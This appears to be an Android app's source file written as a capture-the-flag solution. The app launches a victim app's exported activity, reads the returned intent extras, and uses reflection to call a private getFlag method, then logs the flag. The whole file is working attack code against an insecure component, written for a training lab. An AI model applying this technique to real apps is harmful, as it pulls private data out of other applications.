package com.example.maliciousapp;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import com.example.victimapp.FlagContainer;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";
    public static final int REQUEST_CODE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
        this.startActivityForResult(intent, REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE  && resultCode  == RESULT_OK) {
            try {
                for (String p: data.getExtras().keySet()) {
                    Log.i(TAG, "key: " + p + " value: " + data.getExtras().get(p));
                }
                FlagContainer s =  (FlagContainer) data.getExtras().get("flag");
                Method method = s.getClass().getDeclaredMethod("getFlag");;
                method.setAccessible(true);
                Object r = method.invoke(s);
                Log.i(TAG, "FLAG = "  + r.toString());
            } catch (Exception e){
                Log.i(TAG, Log.getStackTraceString(e));
            }
        }
    }
}